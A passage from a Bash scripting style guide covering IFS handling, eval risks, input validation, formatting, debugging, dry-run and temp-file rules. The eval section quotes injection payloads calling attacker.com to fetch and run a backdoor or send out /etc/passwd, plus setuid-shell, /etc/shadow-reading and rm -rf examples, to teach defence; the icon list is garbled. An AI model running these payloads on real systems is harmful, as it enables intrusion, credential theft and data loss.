SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

parse_csv_line() {
  local -- csv_line="$1"
  local -a fields

  # IFS applies only to this read
  IFS=',' read -ra fields <<< "$csv_line"

  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}

main() {
  parse_csv_line 'apple,banana,orange'
}

main "$@"

#fin
```

**Testing IFS Safety:**

```bash
# Verify IFS protection
test_ifs_safety() {
  local -- original_ifs="$IFS"
  IFS='/'  # Set malicious IFS
  parse_csv_line "apple,banana,orange"

  [[ "$IFS" == "$original_ifs" ]] || {
    error 'IFS leaked - security vulnerability!'
    return 1
  }
}

# Display current IFS
debug_ifs() {
  >&2 printf 'IFS bytes: %s\n' "$(printf '%s' "$IFS" | od -An -tx1)"
  >&2 echo "IFS length: ${#IFS}"
}
```

**Summary:**

- **Set IFS explicitly** at script start: `IFS=$' \t\n'; readonly IFS`
- **Use one-line assignment** for single commands: `IFS=',' read -ra fields <<< "$data"`
- **Use local IFS** in functions: `local -- IFS; IFS=','`
- **Use subshells** to isolate: `( IFS=','; commands )`
- **Always restore IFS** if modifying: `saved_ifs="$IFS"; IFS=','; ...; IFS="$saved_ifs"`
- **Never trust inherited IFS** - always set it yourself

**Key principle:** IFS is a global variable affecting word splitting throughout your script. Treat it as security-critical and always protect changes with proper scoping or save/restore patterns.


---


**Rule: BCS1204**

## Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary.**

**Rationale:**

- **Code Injection**: Executes arbitrary code, allowing complete system compromise with attacker-controlled input
- **No Sandboxing**: Runs with full script privileges (file access, network, command execution)
- **Bypasses Validation**: Sanitized input can still contain metacharacters enabling injection
- **Difficult to Audit**: Dynamic code construction makes security review nearly impossible
- **Complex Escaping**: Quoting requirements are frequently implemented incorrectly
- **Better Alternatives**: Arrays, indirect expansion, associative arrays solve almost every use case

**Understanding eval:**

`eval` performs all expansions on a string, then executes the result as a command. **Dangerous: eval performs expansion TWICE.**

```bash
# Double expansion danger
var='$(whoami)'
eval "echo $var"  # First: echo $(whoami), Second: executes whoami!
# Output: username
```

**Critical Attack Patterns:**

**1. Direct Command Injection:**
```bash
#  Vulnerable
user_input="$1"
eval "$user_input"

# Attack:
./script.sh 'rm -rf /tmp/*'
./script.sh 'curl https://attacker.com/backdoor.sh | bash'
./script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
```

**2. Variable Name Injection:**
```bash
#  Vulnerable - dynamic variable assignment
var_name="$1"
var_value="$2"
eval "$var_name='$var_value'"

# Attack via variable name:
./script.sh 'x=$(rm -rf /data)' 'ignored'  # Command substitution in name!

# Attack via variable value:
./script.sh 'x' '$(cat /etc/shadow > /tmp/stolen)'  # Command in value!
```

**3. Sanitization Bypass:**
```bash
#  Insufficient sanitization
sanitized="${user_expr//[^0-9+\\-*\\/]/}"  # Only digits/operators
eval "result=$sanitized"  # Still dangerous!

# Attack:
./script.sh '1+1)); curl https://attacker.com/steal?data=$(cat /etc/passwd); echo $((1'
./script.sh 'PATH=0'  # Overwrites critical variable
```

**4. Log Injection:**
```bash
#  Vulnerable logging
log_event() {
  local -- log_template='echo "$timestamp - Event: $event" >> /var/log/app.log'
  eval "$log_template"
}

# Attack:
./script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'
# Executes three commands: echo, cat (malicious), echo
```

**Safe Alternatives:**

**1. Arrays for Command Construction:**
```bash
#  Safe - no eval needed
build_find_command() {
  local -- search_path="$1"
  local -- file_pattern="$2"
  local -a cmd=(find "$search_path" -type f -name "$file_pattern")
  "${cmd[@]}"
}

# Dynamic options
declare -a cmd=(find /data -type f)
[[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
[[ -n "$size" ]] && cmd+=(-size "$size")
"${cmd[@]}"
```

**2. Indirect Expansion for Variable References:**
```bash
#  Wrong
var_name='HOME'
eval "value=\\$$var_name"

#  Correct - indirect expansion
echo "${!var_name}"

#  Safe assignment
printf -v "$var_name" '%s' "$value"
```

**3. Associative Arrays for Dynamic Data:**
```bash
#  Wrong - dynamic variables
for i in {1..5}; do
  eval "var_$i='value $i'"
done

#  Correct - associative array
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done
echo "${data[var_3]}"
```

**4. Case/Arrays for Function Dispatch:**
```bash
#  Wrong
eval "${action}_function"

#  Case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  restart) restart_function ;;
  *)       die 22 "Invalid action: $action" ;;
esac

#  Array lookup
declare -A actions=([start]=start_function [stop]=stop_function)
if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
else
  die 22 "Invalid action: $action"
fi
```

**5. Validated Configuration Parsing:**
```bash
#  Wrong
eval "$config_line"

#  Better - validate before assignment
IFS='=' read -r key value <<< "$config_line"
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
else
  die 22 "Invalid configuration key: $key"
fi

#  Safe config sourcing
if [[ -f config.txt && -r config.txt ]]; then
  if grep -qE '(eval|exec|`|\$\()' config.txt; then
    die 1 'Config file contains dangerous patterns'
  fi
  source config.txt
fi
```

**6. Arithmetic with Validation:**
```bash
#  Wrong
eval "result=$((user_expr))"

#  Validate first
if [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]]; then
  result=$((user_expr))
else
  die 22 "Invalid arithmetic expression"
fi

#  Use bc for isolation
result=$(bc <<< "$user_expr")
```

**Edge Cases:**

**Dynamic service status in loops:**
```bash
#  Seems necessary
for service in nginx apache mysql; do
  eval "${service}_status=\$(systemctl is-active $service)"
done

#  Associative array
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done
```

**Key Anti-Patterns:**

```bash
#  Wrong patterns
eval "$user_command"                      # Any user input
eval "$var_name='$var_value'"            # Variable assignment
eval "source $config_file"                # Config sourcing
for file in *.txt; do eval ".."; done    # Loops
eval "if [[ -n \\$$var_name ]]; .."      # Variable testing
eval "echo \$$var_name"                   # Indirect access

#  Correct alternatives
case "$user_command" in ..; esac          # Whitelist validation
printf -v "$var_name" '%s' "$var_value"  # Safe assignment
source "$config_file"                     # Direct sourcing
[[ -v "$var_name" ]]                     # -v test
echo "${!var_name}"                       # Indirect expansion
```

**Detection and Testing:**

```bash
# Find eval usage
grep -rn 'eval.*\$' /path/to/scripts/

# ShellCheck catches eval issues
shellcheck -x script.sh  # SC2086 warning

# Test for vulnerabilities
test_eval_safety() {
  local -- malicious='$(rm -rf /tmp/test_*)'
  mkdir -p /tmp/test_target
  process_input "$malicious"
  if [[ ! -d /tmp/test_target ]]; then
    error 'VULNERABILITY: eval executed malicious code!'
    return 1
  fi
  rm -rf /tmp/test_target
}
```

**Summary:**

- **Never use eval with untrusted input** - no exceptions
- **Avoid eval entirely** - safer alternatives exist for all common use cases
- **Use arrays** for command construction: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
- **Use indirect expansion** for variable references: `"${!var_name}"`
- **Use associative arrays** for dynamic data storage
- **Use case/array lookups** for function dispatch
- **Enable ShellCheck** to catch eval misuse
- **Audit regularly** for eval usage in codebases

**Key principle:** If you think you need `eval`, you're solving the wrong problem. There is almost always a safer alternative using proper Bash features.

---


**Rule: BCS1205**

## Input Sanitization

**Always validate and sanitize user input to prevent security issues.**

**Rationale:**
- Prevent injection attacks (code execution, directory traversal)
- Validate data types and formats before processing
- Fail early on invalid input (defense in depth)

**1. Filename validation:**

```bash
sanitize_filename() {
  local -- name="$1"
  [[ -n "$name" ]] || die 22 'Filename cannot be empty'

  # Remove directory traversal attempts
  name="${name//\.\./}"; name="${name//\//}"

  # Allow only safe characters: alphanumeric, dot, underscore, hyphen
  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || \
    die 22 "Invalid filename '$name': contains unsafe characters"

  # Reject hidden files and excessive length
  [[ "$name" =~ ^\. ]] && die 22 "Filename cannot start with dot: $name"
  ((${#name} > 255)) && die 22 "Filename too long (max 255 chars): $name"

  echo "$name"
}
```

**2. Numeric input validation:**

```bash
# Validate integer (positive or negative)
validate_integer() {
  local -- input="$1"
  [[ -n "$input" && "$input" =~ ^-?[0-9]+$ ]] || die 22 "Invalid integer: '$input'"
  echo "$input"
}

# Validate positive integer
validate_positive_integer() {
  local -- input="$1"
  [[ -n "$input" && "$input" =~ ^[0-9]+$ ]] || die 22 "Invalid positive integer: '$input'"
  [[ "$input" =~ ^0[0-9] ]] && die 22 "Number cannot have leading zeros: $input"
  echo "$input"
}

# Validate with range check
validate_port() {
  local -- port="$1"
  port=$(validate_positive_integer "$port")
  ((port >= 1 && port <= 65535)) || die 22 "Port must be 1-65535: $port"
  echo "$port"
}
```

**3. Path validation:**

```bash
# Validate path is within allowed directory
validate_path() {
  local -- input_path="$1"
  local -- allowed_dir="$2"

  # Resolve to absolute path and ensure within allowed directory
  local -- real_path
  real_path=$(realpath -e -- "$input_path") || die 22 "Invalid path: $input_path"
  [[ "$real_path" == "$allowed_dir"* ]] || die 5 "Path outside allowed directory: $real_path"

  echo "$real_path"
}
```

**4. Email validation:**

```bash
validate_email() {
  local -- email="$1"
  [[ -n "$email" ]] || die 22 'Email cannot be empty'

  # Basic email regex (sufficient for most cases)
  local -- email_regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
  [[ "$email" =~ $email_regex ]] || die 22 "Invalid email format: $email"
  ((${#email} <= 254)) || die 22 "Email too long (max 254 chars): $email"

  echo "$email"
}
```

**5. URL validation:**

```bash
validate_url() {
  local -- url="$1"
  [[ -n "$url" ]] || die 22 'URL cannot be empty'

  # Only allow http/https, reject credentials
  [[ "$url" =~ ^https?:// ]] || die 22 "URL must start with http:// or https://: $url"
  [[ "$url" =~ @ ]] && die 22 'URL cannot contain credentials'

  echo "$url"
}
```

**6. Whitelist validation:**

```bash
validate_choice() {
  local -- input="$1"
  shift
  local -a valid_choices=("$@")

  local choice
  for choice in "${valid_choices[@]}"; do
    [[ "$input" == "$choice" ]] && return 0
  done

  die 22 "Invalid choice '$input'. Valid: ${valid_choices[*]}"
}

# Usage
declare -a valid_actions=('start' 'stop' 'restart' 'status')
validate_choice "$user_action" "${valid_actions[@]}"
```

**7. Username validation:**

```bash
validate_username() {
  local -- username="$1"
  [[ -n "$username" ]] || die 22 'Username cannot be empty'

  # Standard Unix username rules: lowercase, start with letter/underscore
  [[ "$username" =~ ^[a-z_][a-z0-9_-]*$ ]] || die 22 "Invalid username: $username"
  ((${#username} >= 1 && ${#username} <= 32)) || \
    die 22 "Username must be 1-32 characters: $username"

  echo "$username"
}
```

**8. Command injection prevention:**

```bash
#  DANGEROUS - command injection vulnerability
user_file="$1"
cat "$user_file"  # If user_file="; rm -rf /", disaster!

#  Safe - validate first, use -- separator
validate_filename "$user_file"
cat -- "$user_file"

#  DANGEROUS - eval with user input
eval "$user_command"  # NEVER DO THIS!

#  Safe - whitelist allowed commands
case "$user_command" in
  start|stop|restart) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac
```

**9. Option injection prevention:**

```bash
#  Dangerous - if user_file="--delete-all", disaster!
rm "$user_file"

#  Safe - use -- separator or prepend ./
rm -- "$user_file"
ls ./"$user_file"
```

**Complete validation example:**

```bash
#!/usr/bin/env bash
set -euo pipefail

validate_positive_integer() {
  local input="$1"
  [[ -n "$input" && "$input" =~ ^[0-9]+$ ]] || die 22 "Invalid positive integer: $input"
  echo "$input"
}

sanitize_filename() {
  local name="$1"
  name="${name//\.\./}"; name="${name//\//}"
  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || die 22 "Invalid filename: $name"
  echo "$name"
}

# Parse and validate arguments
while (($#)); do case $1 in
  -c|--count)  noarg "$@"; shift; count=$(validate_positive_integer "$1") ;;
  -f|--file)   noarg "$@"; shift; filename=$(sanitize_filename "$1") ;;
  -*)          die 22 "Invalid option: $1" ;;
  *)           die 2 "Unexpected argument: $1" ;;
esac; shift; done

# Validate required arguments
[[ -n "${count:-}" ]] || die 2 'Missing required option: --count'
[[ -n "${filename:-}" ]] || die 2 'Missing required option: --file'

# Use validated input safely
for ((i=0; i<count; i+=1)); do
  echo "Processing iteration $i" >> "$filename"
done
```

**Critical anti-patterns:**

```bash
#  WRONG - trusting user input
rm -rf "$user_dir"  # user_dir="/" = disaster!

#  Correct - validate within safe base
validate_path "$user_dir" "/safe/base/dir"
rm -rf "$user_dir"

#  WRONG - blacklist approach (always incomplete)
[[ "$input" != *'rm'* ]] || die 1 'Invalid input'  # Easily bypassed!

#  Correct - whitelist approach
[[ "$input" =~ ^[a-zA-Z0-9]+$ ]] || die 1 'Invalid input'
```

**Security principles:**
1. **Whitelist over blacklist** - define what IS allowed
2. **Validate early** - check input before processing
3. **Fail securely** - reject invalid input with clear error
4. **Use `--` separator** - prevent option injection
5. **Never use `eval`** with user input
6. **Absolute paths** - prevent PATH manipulation
7. **Least privilege** - minimum necessary permissions


---


**Rule: BCS1300**

# Code Style & Best Practices

This section establishes coding conventions organized into themed subsections: code formatting (2-space indentation, 100-character line length, consistent alignment), commenting practices (explain WHY not WHAT, focus on rationale and business logic), blank line usage for visual section separation, section comment patterns using banner-style markers, language-specific practices (Bash idioms, pattern preferences, modern features), and development practices (mandatory ShellCheck compliance, testing patterns, version control integration). These guidelines ensure scripts are readable, maintainable, and professional while leveraging modern Bash 5.2+ features effectively.


---


**Rule: BCS1301**

## Code Formatting

#### Indentation
- !! Use 2 spaces for indentation (NOT tabs)
- Maintain consistent indentation throughout

#### Line Length
- Keep lines under 100 characters when practical
- Long file paths and URLs can exceed 100 chars when necessary
- Use line continuation with `\` for long commands


---


**Rule: BCS1302**

## Comments

Comments must explain **WHY** (rationale, business logic, non-obvious decisions), not **WHAT** (code already shows):

```bash
# Section separator (80 dashes)
# --------------------------------------------------------------------------------

# âœ“ Good - explains WHY (rationale and special cases)
# PROFILE_DIR intentionally hardcoded to /etc/profile.d for system-wide bash profile
# integration, regardless of PREFIX. This ensures builtins are available in all
# user sessions. To override, modify this line or use a custom install method.
declare -- PROFILE_DIR=/etc/profile.d

((max_depth > 0)) || max_depth=255  # -1 means unlimited (WHY -1 is special)

# If user explicitly requested --builtin, try to install dependencies
if ((BUILTIN_REQUESTED)); then
  warn 'bash-builtins package not found, attempting to install...'
fi

# âœ— Bad - restates WHAT the code already shows
# Set PROFILE_DIR to /etc/profile.d
declare -- PROFILE_DIR=/etc/profile.d

# Check if max_depth is greater than 0, otherwise set to 255
((max_depth > 0)) || max_depth=255

# If BUILTIN_REQUESTED is non-zero
if ((BUILTIN_REQUESTED)); then
  # Print warning message
  warn 'bash-builtins package not found, attempting to install...'
fi
```

**Comment when:**
- Non-obvious business rules or edge cases
- Intentional deviations from normal patterns
- Complex logic not immediately apparent
- Why specific approach chosen over alternatives
- Subtle gotchas or side effects

**Don't comment:**
- Simple variable assignments
- Obvious conditionals
- Standard patterns from style guide
- Self-explanatory code with good naming

**Documentation icons:**
```
info    â—‰
debug   â¦¿
warn    â–²
success âœ“
error   âœ—
```

Avoid other icons/emoticons unless justified.


---


**Rule: BCS1303**

## Blank Line Usage

Use blank lines strategically to improve readability by creating visual separation between logical blocks:

```bash
#!/bin/bash
set -euo pipefail

# Script metadata
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR

# Default values
declare -- PREFIX=/usr/local
declare -i DRY_RUN=0

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib

check_prerequisites() {
  info 'Checking prerequisites...'

  # Check for gcc
  if ! command -v gcc &> /dev/null; then
    die 1 "'gcc' compiler not found."
  fi

  success 'Prerequisites check passed'
}

main() {
  check_prerequisites
  install_files
}

main "$@"
#fin
```

**Guidelines:**
- One blank line between functions
- One blank line between logical sections within functions
- One blank line after section comments
- One blank line between groups of related variables
- Blank lines before/after multi-line conditional or loop blocks
- Avoid multiple consecutive blank lines
- No blank line needed between short, related statements


---


**Rule: BCS1304**

## Section Comments

Use lightweight section comments to organize code into logical groups:

```bash
# Default values
declare -- PREFIX=/usr/local
declare -i VERBOSE=1
declare -i DRY_RUN=0

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib

# Core message function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  # ...
}

# Conditional messaging functions
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Unconditional messaging functions
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
```

**Guidelines:**
- Simple `# Description` format (no dashes/box drawing)
- Short, descriptive (2-4 words)
- Place immediately before group
- Blank line after group
- Group related variables, functions, or blocks
- Reserve 80-dash separators for major divisions only

**Common patterns:**
- `# Default values` / `# Configuration`
- `# Derived paths` / `# Computed variables`
- `# Core message function`
- `# Conditional messaging functions` / `# Unconditional messaging functions`
- `# Helper functions` / `# Utility functions`
- `# Business logic` / `# Main logic`
- `# Validation functions` / `# Installation functions`


---


**Rule: BCS1305**

## Language Best Practices

#### Command Substitution
Always use `$()` instead of backticks for command substitution.

```bash
#  Correct - modern syntax
var=$(command)
result=$(cat "$file" | grep pattern)

#  Wrong - deprecated syntax
var=`command`
result=`cat "$file" | grep pattern`
```

**Rationale:** `$()` is visually clearer, nests naturally without escaping, has better editor support, and is the modern POSIX preference.

**Nesting example:**
```bash
#  Easy to read
outer=$(echo "inner: $(date +%T)")

#  Requires escaping
outer=`echo "inner: \`date +%T\`"`
```

#### Builtin Commands vs External Commands
Always prefer shell builtins over external commands.

```bash
#  Builtins - fast and reliable
addition=$((x + y))
string=${var^^}  # uppercase
string=${var,,}  # lowercase
[[ -f "$file" ]]

#  External commands - slow
addition=$(expr "$x" + "$y")
string=$(echo "$var" | tr '[:lower:]' '[:upper:]')
[ -f "$file" ]
```

**Rationale:** Builtins are 10-100x faster (no process creation), have no PATH/binary dependencies, guaranteed available in bash, avoid subshell and pipe failures.

**Common replacements:**

| External | Builtin Alternative | Example |
|----------|---------------------|---------|
| `expr` | `$(())` | `$((x + y))` |
| `basename` | `${var##*/}` | `${path##*/}` |
| `dirname` | `${var%/*}` | `${path%/*}` |
| `tr` (case) | `${var^^}` or `${var,,}` | `${str,,}` |
| `test`/`[` | `[[` | `[[ -f "$file" ]]` |
| `seq` | `{1..10}` or `for ((i=1; i<=10; i++))` | Faster loops |

**When external commands needed:**
```bash
# No builtin equivalent exists
checksum=$(sha256sum "$file")
current_user=$(whoami)
sorted_data=$(sort "$file")
```


---


**Rule: BCS1306**

## Development Practices

#### ShellCheck Compliance
ShellCheck is **compulsory**. Use `#shellcheck disable=...` only with documented rationale.

```bash
# Document intentional violations with reason
#shellcheck disable=SC2046  # Intentional word splitting for flag expansion
set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}"

# Run during development
shellcheck -x myscript.sh
```

#### Script Termination
```bash
# Always end scripts with #fin (or #end) marker
main "$@"
#fin

```

#### Defensive Programming
```bash
# Default critical variables
: "${VERBOSE:=0}"
: "${DEBUG:=0}"

# Validate inputs early
[[ -n "$1" ]] || die 1 'Argument required'

# Guard against unset variables
set -u
```

#### Performance Considerations
```bash
# Minimize subshells
# Use built-in string operations over external commands
# Batch operations when possible
# Use process substitution over temp files
```

#### Testing Support
```bash
# Make functions testable
# Use dependency injection for external commands
# Support verbose/debug modes
# Return meaningful exit codes
```


---


**Rule: BCS1307**

## Emoticons

Standard icons for codebase documentation (internal/external):

## Standard Severity Levels

    É  info: Informational
    ¿ debug: Verbose/Debug
    ²  warn: Warning
      error: Error
      success: success/done

## Standard Extended Icons

       Caution/Important
    "  Fatal/Critical
    »  Redo/Retry/Update

### Status & Feedback

       Alert/Important
    Æ  Checkpoint
    Ï  In Progress
    Ë  Pending
    Ð  Partial

### Actions & Operations

    »  Refresh/Retry/Reload
    ò  Cycle/Repeat
    ¶  Start/Execute/Play
       Stop/Halt
    ø  Pause
    ù  Terminate
    †  Power/System
    0  Menu/List
    ™  Settings/Config

### Directional & Flow

    ’  Forward/Next/Continue
      Back/Previous
    ‘  Up/Upgrade/Increase
    “  Down/Downgrade/Decrease
    Ä  Swap/Exchange
    Å  Sync/Bidirectional
    4  Return/Back Up
    5  Forward/Down Into

### Process States

    ó  Processing/Loading
    ñ  Timer/Duration


---


**Rule: BCS1400**

# Advanced Patterns

This section covers 10 advanced patterns for production-grade system administration and automation scripts: debugging techniques (set -x, PS4 customization), dry-run mode for safe testing, secure temporary file handling with mktemp, environment variable patterns, regular expressions for pattern matching, background job management for parallel execution, structured logging, performance profiling for optimization, testing methodologies, and progressive state management using boolean flags that change based on runtime conditions. These patterns address real-world challenges: safe testing before deployment, performance optimization, robust error handling, and maintainable state logic separating decision-making from execution.


---


**Rule: BCS1401**

## Debugging and Development

Enable debugging features for development and troubleshooting.

```bash
# Debug mode implementation
declare -i DEBUG="${DEBUG:-0}"

# Enable trace mode when DEBUG is set
((DEBUG)) && set -x

# Enhanced PS4 for better trace output
export PS4='+ ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:+${FUNCNAME[0]}():} '

# Conditional debug output function
debug() {
  ((DEBUG)) || return 0
  >&2 _msg "$@"
}

# Usage
DEBUG=1 ./script.sh  # Run with debug output
```


---


**Rule: BCS1402**

## Dry-Run Pattern

Implement preview mode for operations that modify system state, allowing users to see what would happen without making actual changes.

```bash
# Declare dry-run flag
declare -i DRY_RUN=0

# Parse from command-line
-n|--dry-run) DRY_RUN=1 ;;
-N|--not-dry-run) DRY_RUN=0 ;;

# Pattern: Check flag, show preview message, return early
build_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would build standalone binaries'
    return 0
  fi

  # Actual build operations
  make standalone || die 1 'Build failed'
}

install_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would install:' \
         "  $BIN_DIR/mailheader" \
         "  $BIN_DIR/mailmessage" \
         "  $BIN_DIR/mailheaderclean"
    return 0
  fi

  # Actual installation operations
  install -m 755 build/bin/mailheader "$BIN_DIR"/
  install -m 755 build/bin/mailmessage "$BIN_DIR"/
  install -m 755 build/bin/mailheaderclean "$BIN_DIR"/
}
```

**Pattern structure:**
1. Check `((DRY_RUN))` at start of state-modifying functions
2. Display preview with `[DRY-RUN]` prefix using `info`
3. Return early (exit code 0) without performing operations
4. Proceed with real operations only when dry-run disabled

**Rationale:** Separates decision logic from action. Script flows through same functions whether in dry-run mode or not, allowing logic verification without side effects. Safe preview of destructive operations; users verify paths/files/commands before execution.


---


**Rule: BCS1403**

## Temporary File Handling

**Always use `mktemp` to create temporary files and directories. Use trap handlers to ensure cleanup occurs even on script failure or interruption. Store temp file paths in variables, make them readonly, and clean up in EXIT trap.**

**Rationale:**
- **Security**: mktemp creates files with secure permissions (0600) in safe locations, preventing unauthorized access
- **Uniqueness**: Guaranteed unique filenames prevent collisions between processes
- **Atomicity**: mktemp creates files atomically, preventing race conditions
- **Cleanup Guarantee**: EXIT trap ensures cleanup even when script fails or is interrupted
- **Portability**: mktemp works consistently across Unix-like systems

**Basic temp file creation:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

#  CORRECT - Create temp file and ensure cleanup
create_temp_file() {
  local -- temp_file

  temp_file=$(mktemp) || die 1 'Failed to create temporary file'
  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created temp file: $temp_file"

  # Use temp file
  echo 'Test data' > "$temp_file"
  cat "$temp_file"
}

main() {
  create_temp_file
}

main "$@"

#fin
```

**Temp directory creation:**

```bash
#  CORRECT - Create temp directory and ensure cleanup
temp_dir=$(mktemp -d) || die 1 'Failed to create temporary directory'
trap 'rm -rf "$temp_dir"' EXIT
readonly -- temp_dir

echo 'file1' > "$temp_dir/file1.txt"
echo 'file2' > "$temp_dir/file2.txt"
```

**Custom templates:**

```bash
# Template with recognizable prefix
temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX) ||
  die 1 'Failed to create temporary file'
trap 'rm -f "$temp_file"' EXIT

# Add extension (mktemp doesn't support directly)
temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX)
mv "$temp_file" "$temp_file.json"
temp_file="$temp_file.json"
trap 'rm -f "$temp_file"' EXIT
```

**Multiple temp files:**

```bash
# Global array for temp files
declare -a TEMP_FILES=()

cleanup_temp_files() {
  local -i exit_code=$?
  local -- file

  if [[ ${#TEMP_FILES[@]} -gt 0 ]]; then
    for file in "${TEMP_FILES[@]}"; do
      if [[ -f "$file" ]]; then
        rm -f "$file"
      elif [[ -d "$file" ]]; then
        rm -rf "$file"
      fi
    done
  fi

  return "$exit_code"
}

trap cleanup_temp_files EXIT

# Register temp files
temp1=$(mktemp) || die 1 'Failed to create temporary file'
TEMP_FILES+=("$temp1")

temp2=$(mktemp) || die 1 'Failed to create temporary file'
TEMP_FILES+=("$temp2")
```

**Security verification:**

```bash
#  CORRECT - Verify secure permissions
temp_file=$(mktemp) || die 1 'Failed to create temp file'

# Check permissions (should be 0600)
perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
if [[ "$perms" != '600' ]]; then
  rm -f "$temp_file"
  die 1 "Temp file has insecure permissions: $perms"
fi

trap 'rm -f "$temp_file"' EXIT
```

**Anti-patterns:**

```bash
#  WRONG - Hard-coded temp file path
temp_file="/tmp/myapp_temp.txt"
# Problems: not unique, predictable name, no automatic cleanup

#  CORRECT
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

#  WRONG - Using PID in filename
temp_file="/tmp/myapp_$$.txt"
# Problems: still predictable, race condition, no cleanup

#  WRONG - No cleanup trap
temp_file=$(mktemp)
echo 'data' > "$temp_file"
# Script exits, temp file remains!

#  CORRECT
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

#  WRONG - Multiple traps overwrite each other
temp1=$(mktemp)
trap 'rm -f "$temp1"' EXIT
temp2=$(mktemp)
trap 'rm -f "$temp2"' EXIT  # Overwrites previous trap!

#  CORRECT - Single trap for all cleanup
temp1=$(mktemp) || die 1 'Failed to create temp file'
temp2=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp1" "$temp2"' EXIT

#  BETTER - Cleanup function with array
declare -a TEMP_FILES=()
cleanup() {
  local -- file
  for file in "${TEMP_FILES[@]}"; do
    [[ -f "$file" ]] && rm -f "$file"
  done
}
trap cleanup EXIT

temp1=$(mktemp)
TEMP_FILES+=("$temp1")
temp2=$(mktemp)
TEMP_FILES+=("$temp2")

#  WRONG - Not checking mktemp success
temp_file=$(mktemp)
echo 'data' > "$temp_file"  # May fail silently!

#  CORRECT
temp_file=$(mktemp) || die 1 'Failed to create temp file'

#  WRONG - Insecure permissions
temp_file=$(mktemp)
chmod 666 "$temp_file"  # World writable!

#  CORRECT - Keep default secure permissions (0600)
temp_file=$(mktemp) || die 1 'Failed to create temp file'
```

**Edge Cases:**

**1. Preserve temp files for debugging:**

```bash
declare -i KEEP_TEMP=0

cleanup() {
  local -i exit_code=$?

  if ((KEEP_TEMP)); then
    if [[ ${#TEMP_FILES[@]} -gt 0 ]]; then
      info 'Keeping temp files for debugging:'
      for file in "${TEMP_FILES[@]}"; do
        info "  $file"
      done
    fi
  else
    for file in "${TEMP_FILES[@]}"; do
      [[ -f "$file" ]] && rm -f "$file"
      [[ -d "$file" ]] && rm -rf "$file"
    done
  fi

  return "$exit_code"
}

# Parse --keep-temp option to enable KEEP_TEMP flag
```

**2. Signal handling:**

```bash
cleanup() {
  local -i exit_code=$?

  if [[ -n "$TEMP_FILE" && -f "$TEMP_FILE" ]]; then
    rm -f "$TEMP_FILE"
  fi

  return "$exit_code"
}

# Cleanup on normal exit and signals
trap cleanup EXIT SIGINT SIGTERM
```

**3. Specific directory:**

```bash
# Create temp file in specific directory
temp_file=$(mktemp "$SCRIPT_DIR/temp.XXXXXX") ||
  die 1 'Failed to create temp file in script directory'
trap 'rm -f "$temp_file"' EXIT

# Create temp directory in specific location
temp_dir=$(mktemp -d "$HOME/work/temp.XXXXXX") ||
  die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT
```

**Summary:**
- **Always use mktemp** - never hard-code temp file paths
- **Use trap for cleanup** - ensure cleanup happens even on failure
- **EXIT trap is mandatory** - automatic cleanup when script ends
- **Check mktemp success** - use `|| die` to handle creation failure
- **Default permissions are secure** - mktemp creates 0600 files, 0700 directories
- **Single trap pattern** - combine all cleanup in one trap or use cleanup function with array
- **--keep-temp option** - preserve temp files for debugging
- **Signal handling** - trap SIGINT SIGTERM for interruption cleanup

**Key principle:** Temporary files are a common source of security vulnerabilities and resource leaks. The combination of mktemp + trap EXIT is the gold standard - it's atomic, secure, and guarantees cleanup even when scripts fail or are interrupted.


---


**Rule: BCS1404**

## Environment Variable Best Practices

Proper handling of environment variables.

```bash
# Required environment validation (script exits if not set)
: "${REQUIRED_VAR:?Environment variable REQUIRED_VAR not set}"
: "${DATABASE_URL:?DATABASE_URL must be set}"

